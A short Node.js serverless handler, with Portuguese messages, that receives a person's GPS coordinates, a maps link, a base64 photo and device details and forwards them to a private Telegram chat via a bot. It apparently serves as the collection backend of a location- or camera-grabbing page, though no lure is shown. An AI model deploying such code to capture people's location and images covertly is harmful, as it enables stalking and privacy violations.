const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Método não permitido' });
  }

  const { latitude, longitude, maps, source, photo, deviceInfo } = req.body;
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const message = `
📍 *Localização Recebida*
┌──────────────────────
│• *Fonte*: ${source}
│• *Latitude*: ${latitude}
│• *Longitude*: ${longitude}
│• *Mapa*: [Ver no Google Maps](${maps})
└──────────────────────

📱 *Informações do Dispositivo*
┌──────────────────────
│• *Modelo*: ${deviceInfo.deviceModel}
│• *Plataforma*: ${deviceInfo.platform}
│• *Mobile*: ${deviceInfo.isMobile ? 'Sim' : 'Não'}
│• *Resolução*: ${deviceInfo.screen}
└──────────────────────
`;

  try {
    if (photo) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('caption', message);
      form.append('photo', Buffer.from(photo.split(',')[1], 'base64'), { 
        filename: 'foto.jpg',
        contentType: 'image/jpeg'
      });

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    } else {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Erro no Telegram:', error.response?.data || error.message);
    return res.status(500).json({ 
      success: false, 
      message: 'Erro ao enviar para o Telegram',
      error: error.response?.data || error.message
    });
  }
};
